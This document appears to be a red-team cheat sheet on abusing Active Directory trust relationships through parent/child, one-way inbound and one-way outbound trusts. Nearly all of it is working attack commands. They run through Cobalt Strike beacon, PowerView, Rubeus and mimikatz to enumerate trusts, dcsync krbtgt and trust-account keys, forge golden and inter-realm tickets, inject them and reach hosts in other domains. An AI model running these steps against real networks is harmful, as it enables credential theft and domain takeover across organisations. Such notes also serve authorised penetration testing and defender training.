- Requires **DOMAIN ADMIN** privileges to jump.

## **Parent/Child Trusts in Active Directory**

```powershell
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

beacon> powerpick Get-DomainTrust
# 3. Enumerate basic info required for creating a forged ticket
# Find the SID of Domain Admin / Enterprise Admin group of parent domain
beacon> powerpick Get-DomainGroup -Identity "Domain Admins" -Domain contoso.com -Properties ObjectSid

beacon> powerpick Get-DomainSID -Domain "dublin.contoso.com"

# Domain controller of the parent domain
beacon> powerpick Get-DomainController -Domain contoso.com | select Name

# Domain Admin of parent domain
beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" -Domain contoso.com | select MemberName
```

- Extract **AES key**
```powershell
beacon> dcsync dublin.contoso.com dublin\krbtgt
```

- Create a ticket valid in the parent domain
```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /outfile:C:\Users\Attacker\Desktop\golden

beacon> kerberos_tiket_user $PATH

beacon> jump ...
```


## **One-Way Inbound Trusts**

- Does not require admin, only **medium integrity beacon**

```powershell
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick Get-DomainTrust
#Ver dns del que confia
beacon> powerpick Get-DomainComputer -Domain partner.com -Properties DnsHostName

# 2. Check if members in the current domain are part of any group in the foreign domain
# Enumerate any groups that contain users outside of its domain
beacon> powerpick Get-DomainForeignGroupMember -Domain partner.com
# Verify the username from the SID returned in the previous step
beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120

beacon> powerpick Get-DomainController -Domain partner.com | select Name

#Extract the AES key of the krbtgt from the trusting domain
beacon>  execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> dcsync contoso.com CONTOSO\PARTNER$
```

- Create a ticket valid in the parent domain
```powershell
#SID of my user, group is everything after the "-" in the SID
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:[NTLM HASH] /nowrap


beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:[TICKET] /nowrap

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TICKET]

beacon> ls \\par-jmp-1.partner.com\c$
```

## **One-Way Outbound Trusts**

- Requires **ADMIN**

```powershell
#  1. View the trust type
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick Get-DomainTrust

# 2. Extract the ObjectGUID of the trusted domain.
beacon> ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID

# Extract the NTLM/RC4 hash, TAKE THE FIRST ONE
beacon> mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
```

- Create a ticket valid in the parent domain
```powershell
# Extract the user and see that partner.com = PARTNER$ = DOMAIN
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

# SID of my user, group is everything after the "-" in the SID
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM  /rc4:$RCA /nowrap

# REQUIRES HIGH INTEGRITY BEACON
beacon> make_token CONTOSO\PARTNER$ FakePass

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:$TIK

# Test enumeration of the new domain:
beacon> ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com
```


